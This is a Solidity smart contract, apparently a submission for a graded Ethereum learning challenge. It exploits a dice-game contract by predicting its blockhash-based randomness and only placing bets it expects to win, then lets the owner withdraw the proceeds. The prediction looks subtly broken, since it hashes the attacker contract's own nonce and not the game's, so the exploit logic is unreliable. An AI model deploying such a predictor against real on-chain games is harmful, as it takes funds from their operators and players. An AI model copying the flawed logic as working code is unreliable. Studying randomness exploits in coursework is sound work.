pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;
    uint256 public nonce = 0;


    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    function riggedRoll() external payable {
        require(msg.value >= 0.002 ether, "Not enough Ether");

        // prepare to call rollTheDice
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 predictedRoll = uint256(hash) % 16;

        if(predictedRoll <= 5) {
            (bool sucess,) = address(diceGame).call{value: msg.value}(abi.encodeWithSignature("rollTheDice()"));
            require(sucess, "Dice roll failed.");
        }

        nonce ++;       
      
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address payable to, uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Insufficient balance");
        (bool success, ) = to.call{value: amount}("");
        require(success, "External contract call failed.");
    }

    receive() external payable {}

}
